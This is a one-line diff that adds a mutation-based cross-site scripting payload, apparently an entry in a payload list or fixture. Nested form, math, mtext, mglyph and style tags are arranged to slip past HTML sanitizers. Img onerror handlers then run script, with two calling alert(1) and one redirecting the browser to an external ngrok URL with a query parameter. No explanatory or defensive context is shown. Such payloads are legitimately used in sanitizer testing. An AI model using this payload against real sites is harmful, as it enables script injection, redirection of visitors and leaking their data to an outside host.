@@ -1,0 +1,1 @@
+<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)><form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)> 1 <form><math><mtext></form><form><mglyph><style></math><img src onerror="document.location='http://7c2f-103-93-37-12.ngrok.io/navy.html?c=test'"></style></mglyph></form></mtext></math></form>\n\n
